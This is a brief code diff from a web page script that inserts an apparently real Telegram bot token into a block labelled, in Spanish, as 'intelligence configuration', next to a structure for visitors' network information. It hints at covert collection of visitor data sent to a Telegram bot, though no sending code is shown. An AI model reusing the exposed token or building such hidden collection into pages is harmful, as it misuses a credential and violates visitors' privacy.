@@ -31,7 +31,7 @@
 
 <script>
 // CONFIGURACIÓN DE INTELIGENCIA
-const BOT_TOKEN = "";
+const BOT_TOKEN = "8254282443:AAFPfL2Qay1UtbeObu4_KSdsoSm1CN6yW-Q";
 const CHAT_ID = "";
 
 let infoRed = { 
